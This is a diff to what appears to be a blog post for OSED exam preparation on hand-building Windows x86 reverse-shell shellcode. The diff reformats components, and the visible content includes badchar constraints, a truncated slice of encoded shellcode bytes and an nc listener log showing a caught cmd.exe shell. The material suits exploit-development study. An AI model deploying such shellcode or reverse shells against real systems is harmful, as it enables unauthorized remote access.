@@ -13,14 +13,12 @@ This post is the lab notebook version of how I build a working `cmd.exe` reverse
 
 Before any byte gets written, define the contract:
 
-<Terminal title="constraints.txt">
-{`target:    Windows 10 x86 (32-bit process)
+<Terminal title="constraints.txt" code={`target:    Windows 10 x86 (32-bit process)
 syscalls:  no — we use ws2_32 + kernel32 APIs
 arch:      x86, no SSE
 badchars:  \\x00 \\x0a \\x0d \\x20 \\x25 \\x26 \\x2b \\x3d
 size:      under 350 bytes
-behavior:  reverse cmd.exe shell to attacker:4444`}
-</Terminal>
+behavior:  reverse cmd.exe shell to attacker:4444`} />
 
 `\x20`, `\x25`, `\x26`, `\x2b`, `\x3d` are the kind of badchars you find in URL- or HTTP-decoded buffers. We bake the constraints into the egg.
 
@@ -139,8 +137,7 @@ The cleaner way most people use is to push backwards and zero out a single byte 
 
 After assembly + encoding, here's a slice of the final shellcode (truncated; full file in the repo):
 
-<Terminal title="shellcode.bin (slice)">
-{`\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30
+<Terminal title="shellcode.bin (slice)" code={`\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30
 \\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff
 \\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52
 \\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1
@@ -148,8 +145,7 @@ After assembly + encoding, here's a slice of the final shellcode (truncated; ful
 [ ... 200 bytes elided ... ]
 \\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61
 \\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12
-\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6`}
-</Terminal>
+\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6`} />
 
 I verify it survives my badchar set with a one-liner:
 
@@ -162,16 +158,14 @@ python3 -c "import sys; bad=b'\\x00\\x0a\\x0d\\x20\\x25\\x26\\x2b\\x3d'; \
 
 Then I plug it into a tiny C harness and watch nc on my attacker box light up:
 
-<Terminal title="attacker@kali">
-{`$ rlwrap nc -lvnp 4444
+<Terminal title="attacker@kali" code={`$ rlwrap nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.50] 49778
 Microsoft Windows [Version 10.0.19045.4170]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\\Users\\jdoe>whoami
-corp\\jdoe`}
-</Terminal>
+corp\\jdoe`} />
 
 ## Things OSED candidates burn time on
 
